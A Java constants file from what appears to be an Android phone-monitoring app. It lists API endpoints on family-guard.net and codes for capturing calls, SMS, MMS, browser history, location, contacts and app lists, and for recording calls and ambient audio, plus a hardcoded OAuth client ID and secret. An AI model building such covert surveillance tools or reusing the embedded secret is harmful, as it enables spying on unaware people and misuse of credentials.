package com.inet.android.request;

public class AppConstants {

	// -----------shipping address---------
	final static String MAIN_LINK = "https://family-guard.net/";
	final static String APP_TOKEN_LINK = MAIN_LINK + "api/token";
	final static String INITIAL_LINK = MAIN_LINK + "api/initial";
	final static String CHECK_LINK = MAIN_LINK + "api/check";
	final static String TOKEN_LINK = MAIN_LINK + "oauth/token";
	final static String PERIODIC_LINK = MAIN_LINK + "api/periodic";
	final static String INFORMATIVE_LINK = MAIN_LINK + "api/informative";
	final static String LIST_LINK = MAIN_LINK + "api/list";
	final static String DEL_LINK = MAIN_LINK + "api/remove";

	//------------token-------------------------------
	final public static String CLIENT_ID = "d04e6d2d6ea7e32c04f4e7c87c324458b7c9a617ddeaea731e4bcf446a604370";
	final public static String CLIENT_SECRET = "88e5df97f1926f0c3b9137dd78c38259bd460fc7c0d4bb94827c32bac386ad04";
	
	// -----------type request for insert database------
	final public static int TYPE_FIRST_TOKEN_REQUEST = 1;
	final public static int TYPE_SECOND_TOKEN_REQUEST = 2;
	final public static int TYPE_PERIODIC_REQUEST = 3;
	final public static int TYPE_DATA_REQUEST = 4;
	final public static int TYPE_DEL_REQUEST = 5;
	final public static int TYPE_FILE_REQUEST = 6;

	// -----------type request---------------------

	final public static int TYPE_INFO_REQUEST = 1;
	final public static int TYPE_INCOMING_CALL_REQUEST = 2;
	final public static int TYPE_OUTGOING_CALL_REQUEST = 3;
	final public static int TYPE_MISSED_CALL_REQUEST = 4;
	final public static int TYPE_INCOMING_SMS_REQUEST = 5;
	final public static int TYPE_OUTGOING_SMS_REQUEST = 6;
	final public static int TYPE_HISTORY_BROUSER_REQUEST = 7;
	final public static int TYPE_LOCATION_TRACKER_REQUEST = 9;
	final public static int TYPE_INCOMING_MMS_REQUEST = 10;
	final public static int TYPE_OUTGOING_MMS_REQUEST = 11;
	final public static int TYPE_SERVICE_REQUEST = 12;
	
	final public static int TYPE_IMAGE_REQUEST = 21;
	final public static int TYPE_AUDIO_REQUEST = 22;
	final public static int TYPE_LOG_REQUEST = 20;
	
	// ------------geo mode----------------------
	final public static int LOCATION_TRACKER_MODE = 41;

	// -----------record data---------------------

	final public static int RECORD_CALL = 30;
	final public static int RECORD_ENVORIMENT = 31;
	final public static int RECORD_ENVORIMENT_CALL = 32;
	final public static int KEY_FOR_RECORD = 33;

	// -----------type a one-time function---------------------
	final public static int TYPE_LIST_CALL = 51;
	final public static int TYPE_LIST_SMS = 52;
	final public static int TYPE_LIST_CONTACTS = 53;
	final public static int TYPE_LIST_APP = 54;

	// -----------type a one-time request---------------------
	final public static int TYPE_LIST_CALL_REQUEST = 1;
	final public static int TYPE_LIST_SMS_REQUEST = 2;
	final public static int TYPE_LIST_CONTACTS_REQUEST = 3;
	final public static int TYPE_LIST_APP_REQUEST = 4;
	
	//------------method of sending files-------------------
	final public static int TYPE_DISPATCH = 20;
	
	//-----------path for log file (getExternalStorageDirectory)-------------------------
	final public static String PATH_TO_LOG_FILE = "/SecLogFile.txt";
	
}
